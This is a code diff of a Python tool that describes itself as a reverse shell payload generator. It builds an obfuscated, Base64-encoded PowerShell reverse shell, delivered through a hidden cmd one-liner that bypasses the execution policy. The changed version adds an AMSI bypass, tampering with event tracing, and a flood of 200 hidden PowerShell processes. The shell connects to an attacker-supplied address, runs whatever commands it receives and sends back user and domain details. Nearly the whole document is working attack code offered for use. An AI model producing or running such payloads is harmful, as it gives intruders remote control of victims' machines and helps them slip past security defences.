@@ -2,88 +2,78 @@ import random
 import string
 import base64
 
-# Function to generate random variable names
-def random_variable_name(size=6):
+def random_variable_name(size=8):
     return ''.join(random.choice(string.ascii_letters) for _ in range(size))
 
-# Function to encode a PowerShell script to Base64
-def encode_to_base64(script):
-    encoded_bytes = base64.b64encode(script.encode('utf-16le'))
-    ps_decode = f"$data=[System.Convert]::FromBase64String('{encoded_bytes.decode()}');"
-    ps_decode += f"$decoded=[System.Text.Encoding]::Unicode.GetString($data);"
-    ps_decode += f"iex $decoded"
-    return ps_decode
-
-# Function for basic obfuscation with random variable names
-def basic_obfuscation(script):
-    variables = {f"var{i}": random_variable_name() for i in range(1, 9)}
-    for key, value in variables.items():
-        script = script.replace(key, value)
+def rename_variables(script):
+    variables = {
+        "$36": random_variable_name(),
+        "$54f2cdce": random_variable_name(),
+        "$Isw": random_variable_name(),
+        "$PIwtuneQ": random_variable_name(),
+        "$LjucdE": random_variable_name(),
+        "$1e8": random_variable_name(),
+        "$eil": random_variable_name(),
+        "$eRBwTzLwlp": random_variable_name(),
+        "$Ncq": random_variable_name()
+    }
+    for old, new in variables.items():
+        script = script.replace(old, new)
     return script
 
-# Function to apply mixed obfuscation techniques
-def mixed_obfuscation(script):
-    # Apply basic obfuscation first
-    obfuscated_script = basic_obfuscation(script)
-    # Then encode the result with Base64
-    return encode_to_base64(obfuscated_script)
+def encode_to_base64(script):
+    return base64.b64encode(script.encode("utf-16le")).decode()
 
-# PowerShell script template
-ps_script_template = """
-$var1 = New-Object System.Net.Sockets.TCPClient('IP_ADDRESS',PORT_NUMBER);
-$var2 = $var1.GetStream();
-[byte[]]$var3 = 0..65535|%{{0}};
-while(($var4 = $var2.Read($var3, 0, $var3.Length)) -ne 0){{
-    $var5 = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($var3,0,$var4);
-    $var6 = iex $var5 2>&1 | Out-String;
-    $var7 = $var6 + 'PS ' + (Get-Location).Path + '> ';
-    $var8 = ([text.encoding]::ASCII).GetBytes($var7);
-    $var2.Write($var8,0,$var8.Length);
-    $var2.Flush();
-}}
-$var1.Close();
+def build_cmd_payload(encoded_script):
+    var1 = random_variable_name()
+    var2 = random_variable_name()
+    return f'cmd /v /c "set {var1}=powershell && set {var2}=\\" \\" && call !{var1}!!{var2}!-W!{var2}!Hidden!{var2}!-noprofile!{var2}!-executionpolicy!{var2}!bypass!{var2}!-NoExit!{var2}!-e!{var2}!{encoded_script}"'
+
+# PowerShell payload template
+ps_script_template = r"""
+(([Ref].Assembly.GetTypes()|?{$_-clike'*si*s'}).GetFields(40)|?{$_-clike'*Ini*'}).SetValue($276940ea7141886b,$true);
+(([Reflection.Assembly]::LoadWithPartialName('System.Core').GetTypes()|?{$_-clike'*i*'}).GetFields(52)|?{$_-clike'*m_e*d'}).SetValue((([Ref].Assembly.GetTypes()|?{$_-clike'*E*r'}).GetFields(104)|?{$_-clike'*t*w*r'}).GetValue($null),0);
+start-job{$t = $("0"*32700);For ($i = 0; $i -lt 200; $i++) {Start-Process powershell.exe -WindowStyle hidden -Argument "$t;Exit"}};
+$36='IP_ADDRESS';
+$54f2cdce=PORT_NUMBER;
+$Isw=New-Object Net.$276940ea7141886b"Sockets.Socket"([Net.Sockets.AddressFamily]::InterNetwork,[Net.Sockets.SocketType]::Stream, [Net.Sockets.ProtocolType]::Tcp);
+$Isw.Connect($36, $54f2cdce);
+while ($true) {
+    $Error.Clear();
+    $PIwtuneQ = New-Object byte[] $Isw.ReceiveBufferSize;
+    $LjucdE=$Isw.Receive($PIwtuneQ);
+    $1e8=[text.encoding]::UTF8.GetString($PIwtuneQ,0,$LjucdE);
+    try {
+        $eil=Invoke-Expression -Command $1e8 | Out-String;
+    } catch {
+        $eil = $_.Exception.Message+([System.Environment]::NewLine);
+    }
+    if (!$eil) {
+        $eil = $Error[0].Exception.Message;
+    }
+    $eRBwTzLwlp=($env:UserName)+'@'+($env:COMPUTERNAME)+'.'+($env:USERDNSDOMAIN)+([System.Environment]::NewLine)+'PS '+(get-location)+'>';
+    $Ncq=[text.encoding]::UTF8.GetBytes($eil+$eRBwTzLwlp);
+    if($1e8 -eq ''){$Isw.Close();exit;}else{$Isw.Send($Ncq);}
+}
 """
 
-# Function to create the PowerShell bypass execution policy command
-def create_bypass_command(script):
-    bypass_script = f"Start-Process $PSHOME\\powershell.exe -ArgumentList '-ExecutionPolicy Bypass -WindowStyle Hidden -NoProfile -EncodedCommand {script}'"
-    return bypass_script
-
-# Interactive CLI menu for obfuscation mode selection
-def select_obfuscation_mode():
-    print("Select the obfuscation technique:")
-    print("1 - Basic")
-    print("2 - Base64")
-    print("3 - Mixed")
-    choice = input("Enter your choice (1/2/3): ").strip()
-    return choice
-
-# Main function
 def main():
-    obfuscation_choice = select_obfuscation_mode()
-    ip_address = input("Enter the IP address: ").strip()
-    port_number = input("Enter the port number: ").strip()
+    print("=" * 70)
+    print("    Reverse Shell Payload Generator - Single Mode: CMD + Base64 + Renaming")
+    print("    Creator: https://github.com/luftwaffe66")
+    print("=" * 70)
 
-    # Replace placeholders with actual IP address and port number
-    script_with_ip_port = ps_script_template.replace('IP_ADDRESS', ip_address).replace('PORT_NUMBER', port_number)
+    ip = input("Target IP or Hostname: ").strip()
+    port = input("Target Port: ").strip()
 
-    # Apply the chosen obfuscation technique
-    if obfuscation_choice == '1':
-        obfuscated_script = basic_obfuscation(script_with_ip_port)
-    elif obfuscation_choice == '2':
-        obfuscated_script = encode_to_base64(script_with_ip_port)
-    elif obfuscation_choice == '3':
-        obfuscated_script = mixed_obfuscation(script_with_ip_port)
-    else:
-        print("Invalid choice. Exiting.")
-        return
+    script = ps_script_template.replace('IP_ADDRESS', ip).replace('PORT_NUMBER', port)
+    obfuscated_script = rename_variables(script)
+    encoded_script = encode_to_base64(obfuscated_script)
 
-    # Create the bypass command
-    bypass_command = create_bypass_command(obfuscated_script)
+    final_payload = build_cmd_payload(encoded_script)
 
-    # Output the obfuscated script
-    print("\nObfuscated PowerShell script with bypass execution policy:")
-    print(bypass_command)
+    print("\nGenerated Payload (ready to execute via CMD):\n")
+    print(final_payload)
 
 if __name__ == "__main__":
     main()
